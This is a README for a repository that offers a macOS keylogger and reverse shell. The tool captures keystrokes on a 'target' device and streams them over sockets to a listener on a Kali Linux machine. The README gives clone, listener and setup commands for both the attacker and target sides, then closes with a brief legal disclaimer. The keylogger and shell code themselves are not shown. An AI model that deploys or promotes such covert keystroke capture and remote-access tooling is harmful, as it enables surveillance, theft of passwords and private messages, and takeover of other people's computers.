# Keylogger & Reverse Shell Integration

This repository contains a keylogger for macOS and a reverse shell integration script. The keylogger captures keystrokes and sends logs to a remote Kali Linux machine.

## Features
- Reverse shell to Kali Linux.
- Keylogger to capture keystrokes.
- Real-time log sending via sockets.

## Setup

### On Kali Linux
1. Clone this repository:
   ```bash
   git clone https://github.com/TomatoBr0/keylogger-sender.git
   cd keylogger-sender

2. Start the listener:
    ```bash
    ./scripts/listener.sh

### On Target macOS Device
1. Clone the repository: 
    ```bash
    git clone https://github.com/TomatoBr0/keylogger-sender.git
    cd keylogger-sender

2. Run the setup script:
    ```bash
    ./scripts/setup.sh

## Legal Disclaimer:
    Only use this tool on systems you own or have explicit permission to test. Unauthorized use is illegal and unethical.